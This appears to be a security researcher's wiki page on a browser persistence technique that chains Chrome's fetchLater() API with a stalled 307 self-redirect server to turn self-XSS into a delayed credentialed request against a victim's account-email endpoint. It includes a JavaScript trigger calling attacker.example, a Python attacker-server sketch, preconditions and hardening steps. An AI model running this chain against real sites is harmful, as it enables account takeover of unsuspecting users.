---
title: fetchLater() + stalled-redirect browser persistence
slug: fetchlater-redirect-persistence
created_utc: 2026-05-14T00:00:00Z
updated_utc: 2026-05-14T00:00:00Z
tags: [technique/dom-xss, technique/browser-persistence, technique/self-xss]
inbound: []
---

# fetchLater() + stalled-redirect browser persistence

## Pattern
Chrome's new `fetchLater(req, {activateAfter})` API schedules an authenticated
fetch to fire some time later, even after the registering tab is closed.
Per MDN, once the tab closes Chrome flushes all queued `fetchLater`s
immediately — defeating the obvious "wait until victim re-logs in" use case.

JG's original extension: point `fetchLater` at attacker-controlled
infrastructure that **stalls the HTTP response for the per-redirect maximum
Chrome allows (~300s)** and then issues a `307` to itself. Chain ~20
self-redirects to keep the `fetchLater` request alive ~1.5 hours in the
background. When the victim eventually re-authenticates the final hop
replays under their credentials — effectively converting self-XSS into a
session-spanning attack.

`fetchLater` survives where `fetch()` would have died because the request
caches the origin context and is owned by the network stack, not the page.

## Preconditions
- Chrome with `fetchLater` enabled (origin-trial / runtime flag-gated until
  GA).
- Self-XSS or stored DOM gadget on the target.
- One-shot state-changing endpoint reachable via plain cookies (no CSRF token
  in body, no bearer header, no 2FA challenge).
- Same-origin login-CSRF or [[credentialless-iframe-login-csrf]] to attach
  the registration to the attacker's session first.

## Detection
- Target's CSP `connect-src` — does it permit attacker domain?
- Endpoint dependency map — find a state-changing endpoint that only needs
  cookies.

## Triggering
```js
// Inside attacker session, after self-XSS:
fetchLater("https://attacker.example/stall-redirect", {
  method: "POST",
  credentials: "include",
  // activateAfter: 0 → fires immediately if tab closes, but the redirect
  // chain on attacker side stalls each hop ~300s.
});
```

Attacker server (Python sketch):
```python
@app.post("/stall-redirect")
def stall():
    time.sleep(295)
    # 307 to ourselves up to N=20 times, tracked by a cookie counter
    return Response(status=307, headers={"Location": "/stall-redirect"})
```

After ~N*300s, final hop 307s to the real victim state-changer
(`https://target/account/email`) which fires under whatever cookies are
live at that moment — i.e. the victim once they re-login.

## Bypasses / hardening
- `Permissions-Policy: deferred-fetch=()` disables the API.
- CSP `connect-src` excluding attacker domain.
- Server: rotate session IDs on login (defangs the cached-credential trick).

## Seen in the wild
- {date: 2025-06-26, source: CT Ep 128} — JG original research on top of
  Slonser self-XSS chain.

## References
- Slonser blog — Make Self-XSS Great Again
- MDN — `fetchLater()` API
- Critical Thinking Podcast Ep 128
- Related: [[credentialless-iframe-login-csrf]], [[captcha-passthrough-websocket]]
